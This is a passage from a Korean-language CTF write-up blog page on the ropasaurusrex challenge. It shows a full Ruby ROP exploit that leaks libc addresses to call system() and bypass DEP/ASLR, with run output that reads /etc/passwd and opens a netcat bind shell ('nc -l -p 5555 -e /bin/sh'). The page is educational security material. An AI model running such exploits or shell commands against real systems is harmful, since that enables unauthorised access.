+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
+</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -x</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
+</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
+</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
+</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
+</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
+</span><span class='line'><span class="c1"># Fram objdump, &quot;pop/pop/pop/ret&quot;</span>
+</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># The location where read()&#39;s .plt entry is</span>
+</span><span class='line'><span class="n">read_addr_ptr</span> <span class="o">=</span> <span class="mh">0x0804961c</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># The difference between read() and system()</span>
+</span><span class='line'><span class="c1"># Calculated as  read (0xb7f48110) - system (0xb7ec2450)</span>
+</span><span class='line'><span class="c1"># Note: This is the one number that needs to be calculated using the</span>
+</span><span class='line'><span class="c1"># target version of libc rather than my own!</span>
+</span><span class='line'><span class="n">read_system_diff</span> <span class="o">=</span> <span class="mh">0x85cc0</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Generate the payload</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+</span><span class='line'>  <span class="o">[</span>
+</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
+</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+</span><span class='line'>    <span class="c1"># Note that this calls read_addr, which is overwritten by a pointer</span>
+</span><span class='line'>    <span class="c1"># to system() in the previous stack frame</span>
+</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>   <span class="c1"># (this will become system())</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># second read()&#39;s stack frame</span>
+</span><span class='line'>    <span class="c1"># This reads the address of system() from the socket and overwrites</span>
+</span><span class='line'>    <span class="c1"># read()&#39;s .plt entry with it, so calls to read() end up going to</span>
+</span><span class='line'>    <span class="c1"># system()</span>
+</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
+</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
+</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
+</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># write()&#39;s stack frame</span>
+</span><span class='line'>    <span class="c1"># This frame gets the address of the read() function from the .plt</span>
+</span><span class='line'>    <span class="c1"># entry and writes to to stdout</span>
+</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
+</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
+</span><span class='line'>    <span class="mi">1</span><span class="p">,</span>           <span class="c1"># stdout</span>
+</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># retrurn address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+</span><span class='line'>    <span class="n">write_addr</span><span class="p">,</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
+</span><span class='line'>    <span class="c1"># This reads the command we want to run from the socket and puts it</span>
+</span><span class='line'>    <span class="c1"># in our writable &quot;buf&quot;</span>
+</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
+</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
+</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
+</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
+</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Get the result of the first read() call, which is the actual address of read</span>
+</span><span class='line'><span class="n">this_read_addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Calculate the address of system()</span>
+</span><span class='line'><span class="n">this_system_addr</span> <span class="o">=</span> <span class="n">this_read_addr</span> <span class="o">-</span> <span class="n">read_system_diff</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Write the address back, where it&#39;ll be read() into the correct place by</span>
+</span><span class='line'><span class="c1"># the second read() call</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="o">[</span><span class="n">this_system_addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Finally, read the result of the actual command</span>
+</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Clean up</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 실행 결과다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>물론 <code>cat /etc/passwd</code>를 원하는 것으로 바꿀 수 있다 (netcat 리스너를 포함해서!).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;pwd&quot;</span>
+</span><span class='line'>/home/ron
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;whoami&quot;</span>
+</span><span class='line'>ron
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> &amp;
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 3015
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>nc -vv localhost 5555
+</span><span class='line'>debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 5555 <span class="o">(</span>?<span class="o">)</span> open
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/home/ron
+</span><span class='line'>whoami
+</span><span class='line'>ron
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>결론</h2>
+
+<p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.</p>
+
+<p>질문이 있다면 댓글을 달거나 나에게 연락해라!</p>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p><a href="https://wiki.skullsecurity.org/Assembly">링크</a>가 바뀌었다.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Yous</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-19T20:44:03+09:00" pubdate data-updated="true">Mar 19<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/categories/ctf/'>CTF</a>, <a class='category' href='/categories/write-up/'>Write-up</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/" data-via="" data-counturl="http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/" >Tweet</a>
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2014/03/04/design-details-paper-by-facebook/" title="Previous Post: Design Details: Paper by Facebook">&laquo; Design Details: Paper by Facebook</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/">ropasaurusrex: return-oriented programming 입문서</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/03/04/design-details-paper-by-facebook/">Design Details: Paper by Facebook</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/02/24/support-facebook-open-graph-and-twitter-cards-on-octopress/">Octopress에서 Facebook Open Graph와 Twitter Cards 지원하기</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/02/23/apples-ssl-tls-bug/">Apple's SSL/TLS bug</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/01/20/ghost-in-the-shellcode-2014-inview-write-up/">Ghost in the Shellcode 2014: inview Write-up</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  
+  Copyright &copy; 2014 - <a href="http://yous.be">Yous</a> -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
